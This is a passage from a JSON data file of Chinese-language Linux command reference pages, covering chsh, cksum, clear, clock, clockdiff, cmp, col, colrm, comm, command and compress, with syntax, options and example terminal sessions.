        "body": "<h1 id=\"chsh\">chsh</h1>\n<p>用来更换登录系统时使用的shell</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chsh命令</strong> 用来更换登录系统时使用的shell。若不指定任何参数与用户名称，则chsh会以应答的方式进行设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chsh</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-s&lt;<span class=\"hljs-keyword\">shell</span> 名称&gt;或--<span class=\"hljs-keyword\">shell</span>&lt;<span class=\"hljs-keyword\">shell</span> 名称&gt;：更改系统预设的<span class=\"hljs-keyword\">shell</span>环境。；\n-<span class=\"hljs-keyword\">l</span>或--<span class=\"hljs-keyword\">list</span>-shells：列出目前系统可用的<span class=\"hljs-keyword\">shell</span>清单；\n-<span class=\"hljs-keyword\">u</span>或--<span class=\"hljs-keyword\">help</span>：在线帮助；\n-v或-<span class=\"hljs-keyword\">version</span>：显示版本信息。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：要改变默认shell的用户。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>查看系统安装了哪些shell的两种方法：</strong> </p>\n<p>第一种：</p>\n<pre><code class=\"language-shell\">[rocrocket@localhost ~]$ chsh -l\n<span class=\"hljs-regexp\">/bin/</span>sh\n<span class=\"hljs-regexp\">/bin/</span>bash\n<span class=\"hljs-regexp\">/sbin/</span>nologin\n<span class=\"hljs-regexp\">/bin/</span>zsh\n</code></pre>\n<p>第二种：</p>\n<pre><code class=\"language-shell\">[rocrocket@localhost ~]$ cat <span class=\"hljs-regexp\">/etc/</span>shells\n<span class=\"hljs-regexp\">/bin/</span>sh\n<span class=\"hljs-regexp\">/bin/</span>bash\n<span class=\"hljs-regexp\">/sbin/</span>nologin\n<span class=\"hljs-regexp\">/bin/</span>zsh\n</code></pre>\n<p>其实<code>chsh -l</code>也是来查看这个文件。</p>\n<p> <strong>查看当前正在使用的shell：</strong> </p>\n<pre><code class=\"language-shell\">[rocrocket<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-variable\">$ </span>echo <span class=\"hljs-variable\">$SHELL</span>\n<span class=\"hljs-regexp\">/bin/bash</span>\n</code></pre>\n<p>注意SHELL一定要是大写。可以看到，目前使用的shell是<code>/bin/bash</code></p>\n<p> <strong>把我的shell改成zsh：</strong> </p>\n<pre><code class=\"language-shell\">[rocrocket@localhost ~]$ chsh -s /bin/zsh\n<span class=\"hljs-symbol\">Changing</span> shell for rocrocket.\n<span class=\"hljs-symbol\">Password</span>:\n<span class=\"hljs-symbol\">Shell</span> changed.\n[rocrocket@localhost ~]$\n</code></pre>\n<p>使用chsh加选项<code>-s</code>就可以修改登录的shell了！你会发现你现在执行<code>echo $SHELL</code>后仍然输出为<code>/bin/bash</code>，这是因为你需要重启你的shell才完全投入到zsh怀抱中去。<code>chsh -s</code>其实修改的就是<code>/etc/passwd</code>文件里和你的用户名相对应的那一行。现在来查看下：</p>\n<pre><code class=\"language-shell\">[rocrocket@localhost ~]$ cat <span class=\"hljs-regexp\">/etc/</span>passwd|<span class=\"hljs-keyword\">grep</span> ^rocrocket\nrocrocket:x:<span class=\"hljs-number\">500</span>:<span class=\"hljs-number\">500</span>:rocrocket,China:<span class=\"hljs-regexp\">/rocrocket/</span>PSB<span class=\"hljs-regexp\">/home:/</span>bin/zsh\n</code></pre>\n<p>你可以发现输出内容的最后部分已经变成了<code>/bin/zsh</code>了，下次重启的时候，linux就会读取这一命令来启动shell了！</p>\n<p> <strong>把shell修改回/bin/bash：</strong> </p>\n<pre><code class=\"language-shell\">[rocrocket@localhost ~]$ chsh -s /bin/bash\n<span class=\"hljs-symbol\">Changing</span> shell for rocrocket.\n<span class=\"hljs-symbol\">Password</span>:\n<span class=\"hljs-symbol\">Shell</span> changed.\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cksum",
        "des": "检查文件的CRC是否正确",
        "body": "<h1 id=\"cksum\">cksum</h1>\n<p>检查文件的CRC是否正确</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cksum命令</strong> 是检查文件的CRC是否正确，确保文件从一个系统传输到另一个系统的过程中不被损坏。这种方法要求校验和在源系统中被计算出来，在目的系统中又被计算一次，两个数字进行比较，如果校验和相等，则该文件被认为是正确传输了。</p>\n<p>注意：CRC是指一种排错检查方法，即循环冗余校验法。</p>\n<p>指定文件交由cksum命令进行校验后，会返回校验结果供用户核对文件是否正确无误。若不指定任何文件名称或是所给予的文件名为\"-\"，则cksum命令会从标准输入设备中读取数据。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cksum</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：在线帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要计算校验的版本信息。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用cksum命令计算文件\"testfile1\"的完整性，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cksum</span> testfile1            <span class=\"hljs-comment\">#对指定文件进行CRC校验</span>\n</code></pre>\n<p>以上命令执行后，将输出校验码等相关的信息，具体输出信息如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">1263453430 </span><span class=\"hljs-number\">78</span> testfile1     #输出信息\n</code></pre>\n<p>上面的输出信息中，\"1263453430\"表示校验码，\"78\"表示字节数。</p>\n<p>注意：如果文件中有任何字符被修改，都将改变计算后CRC校验码的值。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "clear",
        "des": "清除当前屏幕终端上的任何信息",
        "body": "<h1 id=\"clear\">clear</h1>\n<p>清除当前屏幕终端上的任何信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>clear命令</strong> 用于清除当前屏幕终端上的任何信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">clear\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>直接输入clear命令当前终端上的任何信息就可被清除。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "clock",
        "des": "用于调整 RTC 时间",
        "body": "<h1 id=\"clock\">clock</h1>\n<p>用于调整 RTC 时间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>clock命令</strong>用于调整 RTC 时间。 RTC 是电脑内建的硬件时间，执行这项指令可以显示现在时刻，调整硬件时钟的时间，将系统时间设成与硬件时钟之时间一致，或是把系统时间回存到硬件时钟。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">clock [<span class=\"hljs-params\">--adjust</span>][<span class=\"hljs-params\">--debug</span>][<span class=\"hljs-params\">--directisa</span>][<span class=\"hljs-params\">--getepoch</span>][<span class=\"hljs-params\">--hctosys</span>][<span class=\"hljs-params\">--set</span> <span class=\"hljs-params\">--date=</span><span class=\"hljs-string\">\"&lt;日期时间&gt;\"</span>]\n[<span class=\"hljs-params\">--setepoch</span> <span class=\"hljs-params\">--epoch=</span>&lt; &gt;][<span class=\"hljs-params\">--show</span>][<span class=\"hljs-params\">--systohc</span>][<span class=\"hljs-params\">--test</span>][<span class=\"hljs-params\">--utc</span>][<span class=\"hljs-params\">--version</span>]\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">--<span class=\"hljs-comment\">adjust</span> <span class=\"hljs-comment\">　第一次使用\"</span>--<span class=\"hljs-comment\">set\"或\"</span>--<span class=\"hljs-comment\">systohc\"参数设置硬件时钟，会在/etc目录下产生一个名称为adjtime的文件。当再次使用这两个参数调整硬件时钟，此文件便会记录两次调整间之差异，日后执行clock指令加上\"</span>--<span class=\"hljs-comment\">adjust\"参数时，程序会自动根</span> <span class=\"hljs-comment\">据记录文件的数值差异，计算出平均值，自动调整硬件时钟的时间。</span>\n--<span class=\"hljs-comment\">debug</span> <span class=\"hljs-comment\">　详细显示指令执行过程，便于排错或了解程序执行的情形。</span>\n--<span class=\"hljs-comment\">directisa</span> <span class=\"hljs-comment\">　告诉clock指令不要通过/dev/rtc设备文件，直接对硬件时钟进行存取。这个参数适用于仅有ISA总线结构的老式电脑。</span>\n--<span class=\"hljs-comment\">getepoch</span> <span class=\"hljs-comment\">　把系统核心内的硬件时钟新时代数值，呈现到标准输出设备。</span>\n--<span class=\"hljs-comment\">hctosys</span> <span class=\"hljs-comment\">　Hardware Clock to System Time，把系统时间设成和硬件时钟一致。由于这个动作将会造成系统全面更新文件的存取时间，所以最好在系统启动时就执行它。</span>\n--<span class=\"hljs-comment\">set</span>--<span class=\"hljs-comment\">date</span> <span class=\"hljs-comment\">　设置硬件时钟的日期和时间。</span>\n--<span class=\"hljs-comment\">setepoch</span>--<span class=\"hljs-comment\">epoch=</span>&lt;<span class=\"hljs-comment\">年份</span>&gt; <span class=\"hljs-comment\">　设置系统核心之硬件时钟的新时代数值，年份以四位树字表示。</span>\n--<span class=\"hljs-comment\">show</span> <span class=\"hljs-comment\">　读取硬件时钟的时间，并将其呈现至标准输出设备。</span>\n--<span class=\"hljs-comment\">systohc</span> <span class=\"hljs-comment\">　System Time to Hardware Clock，将系统时间存回硬件时钟内。</span>\n--<span class=\"hljs-comment\">test</span> <span class=\"hljs-comment\">　仅作测试，并不真的将时间写入硬件时钟或系统时间。</span>\n--<span class=\"hljs-comment\">utc</span> <span class=\"hljs-comment\">　把硬件时钟上的时间时为CUT，有时也称为UTC或UCT。</span>\n--<span class=\"hljs-comment\">version</span> <span class=\"hljs-comment\">　显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>获取当前的时间</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">clock </span><span class=\"hljs-comment\"># 获取当前的时间</span>\n</code></pre>\n<p>显示UTC时间</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">clock </span>-utc <span class=\"hljs-comment\">#显示UTC时间</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "clockdiff",
        "des": "检测两台linux主机的时间差",
        "body": "<h1 id=\"clockdiff\">clockdiff</h1>\n<p>检测两台linux主机的时间差</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>在ip报文的首部和ICMP报文的首部都可以放入时间戳数据。 <strong>clockdiff</strong> 程序正是使用时间戳来测算目的主机和本地主机的系统时间差。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-o：使用<span class=\"hljs-built_in\">IP</span>时间戳选项来测量系统时间差。时间戳只用<span class=\"hljs-number\">3</span>个。\n-o1：使用<span class=\"hljs-built_in\">IP</span>时间戳选项来测量系统时间差。用<span class=\"hljs-number\">4</span>个时间戳。如果-o和-o1都没有设置，那么就是用ICMP时间戳来测试系统时间差。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">lixi@lixi-desktop:~$ ping -T tsandaddr www<span class=\"hljs-selector-class\">.ustc</span><span class=\"hljs-selector-class\">.edu</span><span class=\"hljs-selector-class\">.cn</span> -c <span class=\"hljs-number\">1</span>\nPING www<span class=\"hljs-selector-class\">.ustc</span><span class=\"hljs-selector-class\">.edu</span><span class=\"hljs-selector-class\">.cn</span> (<span class=\"hljs-number\">202.38</span>.<span class=\"hljs-number\">64.9</span>) <span class=\"hljs-number\">56</span>(<span class=\"hljs-number\">124</span>) bytes of data.\n<span class=\"hljs-number\">64</span> bytes from <span class=\"hljs-number\">202.38</span>.<span class=\"hljs-number\">64.9</span>: icmp_seq=<span class=\"hljs-number\">1</span> ttl=<span class=\"hljs-number\">62</span> time=<span class=\"hljs-number\">0.823</span> ms\nTS:     lixi-desktop<span class=\"hljs-selector-class\">.local</span> (<span class=\"hljs-number\">210.45</span>.<span class=\"hljs-number\">74.25</span>)    <span class=\"hljs-number\">12522473</span> absolute\n    <span class=\"hljs-number\">210.45</span>.<span class=\"hljs-number\">74.1</span>    -<span class=\"hljs-number\">251</span>\n    local-gw<span class=\"hljs-selector-class\">.ustc</span><span class=\"hljs-selector-class\">.edu</span><span class=\"hljs-selector-class\">.cn</span> (<span class=\"hljs-number\">202.38</span>.<span class=\"hljs-number\">64.126</span>)    <span class=\"hljs-number\">248</span>\n    <span class=\"hljs-number\">202.38</span>.<span class=\"hljs-number\">64.9</span>    -<span class=\"hljs-number\">857514</span>\nUnrecorded hops: <span class=\"hljs-number\">3</span>\n\n--- www<span class=\"hljs-selector-class\">.ustc</span><span class=\"hljs-selector-class\">.edu</span><span class=\"hljs-selector-class\">.cn</span> ping statistics ---\n<span class=\"hljs-number\">1</span> packets transmitted, <span class=\"hljs-number\">1</span> received, <span class=\"hljs-number\">0%</span> packet loss, <span class=\"hljs-selector-tag\">time</span> <span class=\"hljs-number\">0ms</span>\nrtt min/avg/max/mdev = <span class=\"hljs-number\">0.823</span>/<span class=\"hljs-number\">0.823</span>/<span class=\"hljs-number\">0.823</span>/<span class=\"hljs-number\">0.000</span> ms\n</code></pre>\n<p>首先由上面的得出在RRT不大的时候，几个ICMP时间戳的关系。本地主机和202.38.64.9之间的时间差约为：-857514+248-251=-857517。分别用-o（IP选项中时间戳）和不带选项（ICMP路由时间戳）上述路由的系统时间进行测试。得到的结果：</p>\n<pre><code class=\"language-shell\">lixi@lixi-desktop:~# ./clockdiff -o 202.38.64.9  \n<span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span>\n<span class=\"hljs-attribute\">host</span>=202.38.64.9 <span class=\"hljs-attribute\">rtt</span>=1(0)ms/1ms <span class=\"hljs-attribute\">delta</span>=-857517ms/-857517ms Wed Dec 17 11:28:30 2008\n</code></pre>\n<pre><code class=\"language-shell\">lixi@lixi-desktop:~# ./clockdiff 202.38.64.9\n.\n<span class=\"hljs-attribute\">host</span>=202.38.64.9 <span class=\"hljs-attribute\">rtt</span>=750(187)ms/0ms <span class=\"hljs-attribute\">delta</span>=-857517ms/-857517ms Wed Dec 17 11:28:35 2008\n</code></pre>\n<p>两种方法测试的都比较准确。</p>\n<pre><code class=\"language-shell\">lixi@lixi-desktop:~#./clockdiff gigagate1.Princeton.EDU\n<span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span><span class=\"hljs-built_in\">..</span>\n<span class=\"hljs-attribute\">host</span>=gigagate1.Princeton.EDU <span class=\"hljs-attribute\">rtt</span>=307(21)ms/271ms <span class=\"hljs-attribute\">delta</span>=-5ms/-5ms Wed Dec 17 11:50:16 2008\n</code></pre>\n<p>上面是测试一个RTT较大的目的主机和本地主机的系统时间差。不过在使用clockdiff的时候，需要一点运气，因为很多路由会忽略ICMP或IP时间戳。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cmp",
        "des": "比较两个文件是否有差异",
        "body": "<h1 id=\"cmp\">cmp</h1>\n<p>比较两个文件是否有差异</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cmp命令</strong> 用来比较两个文件是否有差异。当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不通之处的字符和列数编号。若不指定任何文件名称或是所给予的文件名为“-”，则cmp指令会从标准输入设备读取数据。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cmp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c或--print-chars：除了标明差异处的十进制字码之外，一并显示该字符所对应字符；</span>\n<span class=\"hljs-deletion\">-i&lt;字符数目&gt;或--ignore-initial=&lt;字符数目&gt;：指定一个数目；</span>\n<span class=\"hljs-deletion\">-l或——verbose：标示出所有不一样的地方；</span>\n<span class=\"hljs-deletion\">-s或--quiet或——silent：不显示错误信息；</span>\n<span class=\"hljs-deletion\">-v或——version：显示版本信息；</span>\n<span class=\"hljs-deletion\">--help：在线帮助。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录：比较两个文件的差异。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用cmp命令比较文件\"testfile\"和文件\"testfile1\"两个文件，则输入下面的命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cmp</span> testfile testfile1            <span class=\"hljs-comment\">#比较两个指定的文件</span>\n</code></pre>\n<p>在上述指令执行之前，使用cat命令查看两个指定的文件内容，如下所示：</p>\n<pre><code class=\"language-shell\">cat testfile                    <span class=\"hljs-comment\">#查看文件内容  </span>\nAbsncn<span class=\"hljs-number\"> 50 </span>                      <span class=\"hljs-comment\">#显示文件“testfile”  </span>\nAsldssja<span class=\"hljs-number\"> 60 </span> \nJslkadjls<span class=\"hljs-number\"> 85 </span>\n\ncat testfile1                   <span class=\"hljs-comment\">#查看文件内容  </span>\nAbsncn<span class=\"hljs-number\"> 50 </span>                      <span class=\"hljs-comment\">#显示文件“testfile1”  </span>\nAsldssjE<span class=\"hljs-number\"> 62 </span> \nJslkadjls<span class=\"hljs-number\"> 85 </span> \n</code></pre>\n<p>然后，再执行cmp命令，并返回比较结果，具体如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cmp</span> testfile testfile1       <span class=\"hljs-comment\">#比较两个文件  </span>\ntestfile testfile1           <span class=\"hljs-comment\">#有差异：第8字节，第2行  </span>\n</code></pre>\n<p>注意：在比较结果中，只能够显示第一比较结果。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "col",
        "des": "过滤控制字符",
        "body": "<h1 id=\"col\">col</h1>\n<p>过滤控制字符</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>col命令</strong> 是一个标准输入文本过滤器，它从标注输入设备读取文本内容，并把内容显示到标注输出设备。在许多UNIX说明文件里，都有RLF控制字符。当我们运用shell特殊字符<code>&gt;</code>和<code>&gt;&gt;</code>，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col命令则能有效滤除这些控制字符。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">col</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：过滤掉所有的控制字符，包括RLF和HRLF；</span>\n<span class=\"hljs-deletion\">-f：滤掉RLF字符，但允许将HRLF字符呈现出来；</span>\n<span class=\"hljs-deletion\">-x：以多个空格字符来表示跳格字符；</span>\n<span class=\"hljs-deletion\">-l&lt;缓冲区列数&gt;：预设的内存缓冲区有128列，用户可以自行指定缓冲区的大小。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "colrm",
        "des": "删除文件中的指定列",
        "body": "<h1 id=\"colrm\">colrm</h1>\n<p>删除文件中的指定列</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>colrm命令</strong> 用于删除文件中的指定列。colrm命令从标准输入设备读取书记，转而输出到标准输出设备。如果不加任何参数，则colrm命令不会过滤任何一行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">colrm</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  起始列号：指定要删除的指定列；</li>\n<li>  结尾列号：指定要删除的结尾列。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "comm",
        "des": "按行比较两个已排序的文件。",
        "body": "<h1 id=\"comm\">comm</h1>\n<p>按行比较两个已排序的文件。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">comm [<span class=\"hljs-keyword\">OPTION</span>]... FILE1 FILE2\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>按行比较两个已排序的文件。</li>\n<li>当<code>FILE1</code>或<code>FILE2</code>为<code>-</code>时，读取标准输入。</li>\n<li>无选项时输出三列，第一列为<code>FILE1</code>独有的行，第二列为<code>FILE2</code>独有的行，第三列为<code>FILE1</code>，<code>FILE2</code>共有的行。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-1                        不输出第一列。</span>\n<span class=\"hljs-deletion\">-2                        不输出第二列。</span>\n<span class=\"hljs-deletion\">-3                        不输出第三列。</span>\n<span class=\"hljs-deletion\">--check-order             检查输入行是否正确的排序，即使它们确实是已排序过的。</span>\n<span class=\"hljs-deletion\">--nocheck-order           不检查输入行是否正确的排序。</span>\n<span class=\"hljs-deletion\">--output-delimiter=STR    使用STR作为输出列之间的分隔符而不是默认的TAB。</span>\n<span class=\"hljs-deletion\">--total                   额外地增加第四列输出概要。</span>\n<span class=\"hljs-deletion\">-z, --zero-terminated     设置行终止符为NUL（空），而不是换行符。</span>\n<span class=\"hljs-deletion\">--help                    显示帮助信息并退出。</span>\n<span class=\"hljs-deletion\">--version                 显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<p>文本 <code>aaa.txt</code> 内容</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># cat aaa.txt </span>\naaa\nbbb\nccc\nddd\neee\n<span class=\"hljs-number\">111</span>\n<span class=\"hljs-number\">222</span>\n</code></pre>\n<p>文本 <code>bbb.txt</code> 内容</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># cat bbb.txt </span>\nbbb\nccc\naaa\nhhh\nttt\njjj\n</code></pre>\n<p>比较结果</p>\n<pre><code class=\"language-shell\">[root@localhost text]# comm --nocheck-order <span class=\"hljs-keyword\">aaa</span><span class=\"hljs-number\">.</span>txt bbb<span class=\"hljs-number\">.</span>txt \n<span class=\"hljs-keyword\">aaa</span>\n                bbb\n                ccc\n        <span class=\"hljs-keyword\">aaa</span>\nddd\neee\n<span class=\"hljs-number\">111</span>\n<span class=\"hljs-number\">222</span>\n        hhh\n        ttt\n        jjj\n</code></pre>\n<p>输出的第一列只包含在aaa.txt中出现的行，第二列包含在bbb.txt中出现的行，第三列包含在aaa.txt和bbb.txt中相同的行。各列之间以制表符（\\t）作为分隔符。</p>\n<h3 id=\"比较排序过的文档\">比较排序过的文档</h3>\n<p>先通过 sort 将文件内容排序：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># sort aaa.txt &gt; aaa1.txt</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># sort bbb.txt &gt; bbb1.txt</span>\n</code></pre>\n<p>比较结果：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># comm aaa1.txt bbb1.txt</span>\n<span class=\"hljs-number\">111</span>\n<span class=\"hljs-number\">222</span>\n        aaa\n        <span class=\"hljs-keyword\">bbb\n</span>        ccc\nddd\neee\n    hhh\n    <span class=\"hljs-keyword\">jjj\n</span>    ttt\n</code></pre>\n<h3 id=\"交集\">交集</h3>\n<p>打印两个文件的交集，需要删除第一列和第二列：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># comm aaa.txt bbb.txt -1 -2</span>\nbbb\nccc\n</code></pre>\n<h3 id=\"差集\">差集</h3>\n<p>通过删除不需要的列，可以得到aaa.txt和bbb.txt的差集：</p>\n<p>aaa.txt的差集</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># comm aaa.txt bbb.txt -2 -3</span>\naaa\nddd\neee\n<span class=\"hljs-number\">111</span>\n<span class=\"hljs-number\">222</span>\n</code></pre>\n<p>bbb.txt的差集</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># comm aaa.txt bbb.txt -1 -3</span>\naaa\nhhh\nttt\njjj\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 comm</code>，<code>info coreutils 'comm invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "command",
        "des": "调用并执行指定的命令",
        "body": "<h1 id=\"command\">command</h1>\n<p>调用并执行指定的命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>command命令</strong> 调用指定的指令并执行，命令执行时不查询shell函数。command命令只能够执行shell内部的命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">command</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令：需要调用的指令及参数。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用command命令调用执行<code>echo Linux</code>，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">command</span> <span class=\"hljs-built_in\">echo</span> Linux            <span class=\"hljs-comment\">#调用执行shell内部指令</span>\n</code></pre>\n<p>上面的命令执行后，将调用执行命令<code>echo Linux</code>，其执行结果如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Linux</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "compress",
        "des": "使用Lempress-Ziv编码压缩数据文件",
        "body": "<h1 id=\"compress\">compress</h1>\n<p>使用Lempress-Ziv编码压缩数据文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>compress命令</strong> 使用“Lempress-Ziv”编码压缩数据文件。compress是个历史悠久的压缩程序，文件经它压缩后，其名称后面会多出\".Z\"的扩展名。当要解压缩时，可执行uncompress指令。事实上uncompress是指向compress的符号连接，因此不论是压缩或解压缩，都可通过compress指令单独完成。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">compress</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：不提示用户，强制覆盖掉目标文件；</span>\n<span class=\"hljs-deletion\">-c：将结果送到标准输出，无文件被改变；</span>\n<span class=\"hljs-deletion\">-r：递归的操作方式；</span>\n<span class=\"hljs-deletion\">-b&lt;压缩效率&gt;：压缩效率是一个介于9~16的数值，预设值为\"16\"，指定愈大的数值，压缩效率就愈高；</span>\n<span class=\"hljs-deletion\">-d：对文件进行解压缩而非压缩；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-V：显示指令版本及程序预设值。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要压缩的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/etc/man.config</code>复到<code>/tmp</code> ，并加以压缩</p>\n<pre><code class=\"language-shell\">[root<span 